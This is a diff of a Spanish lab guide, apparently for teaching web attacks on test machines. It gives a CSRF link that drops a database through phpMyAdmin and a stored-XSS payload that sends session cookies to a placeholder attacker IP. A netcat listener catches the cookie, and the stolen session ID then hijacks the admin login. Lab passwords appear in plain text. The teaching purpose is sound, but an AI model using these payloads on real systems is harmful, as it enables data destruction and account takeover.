@@ -54,7 +54,12 @@ luego copie las paginas web a desarrollar dentro de las carpetas de pruebas
 - index.php
 - agregar.php
 
+CSRF
 2.- Iniciar una sesion de phpmyadmin, en el pc victima y ejecutar
+
+<a href="http://[HOST]/phpmyadmin/sql.php?sql_query=DROP+DATABASE+[DBNAME]">
+
+XSS persistente
 
 3.- copia los archivos que se encuentran en
 
@@ -66,13 +71,42 @@ a la carpeta
 el usuario admin tiene la clave 8888
 el usuario student tiene la clave 1234
 
-en el pc del atacante iniciar un netcat
+en el pc1 del atacante iniciar un netcat
 
 nc -lvp 80
 
-luego como usuario student ingresar al sistema y actualizar la capital de un pais, en el campo capital poner este codigo
+luego como usuario student desde el pc3 de la victima utilizando alguna navegador ingresar al sistema en la url
+
+http://WEBSERVER/xss/
+
+y actualizar la capital de un pais, en el campo capital poner este codigo
+
 
 <a href=# onclick="document.location='http://IP_ATACKER/xss.php?c='+escape(document.cookie);">NOMBRE_CAPITAL</a>
+
+Verificar que todo se encuentre ok luego salir del sistema haciendo click en "logout"
+
+Luego iniciar sesion en el sistema
+
+http://WEBSERVER/xss/
+
+desde el mismo pc3 pero con usuario admin, hacer click encima de la capital que se hizo el cambio previamente
+
+En forma paralela desde otro equipo pc2 iniciar un browser que disponga del plugin tamper, antes de hacer submit como student
+click boton derecho seleccionar "inpeccionar" , ir al menu lado derecho click en "tamper" seleccionar 
+
+- request headers
+- response headers
+
+volver a la pagina hacer login dedde pc2, se abrira el cuado de dialogo de tamper ubicar el campo
+
+set cookie
+
+
+cambiar el PHPSESSID
+
+y reemplazar el valor de la sesion por la variable capturada en netcat
+
 
 
 <a href="http://[HOST]/phpmyadmin/sql.php?sql_query=bbbDROP+DATABASE+[DBNAME]">
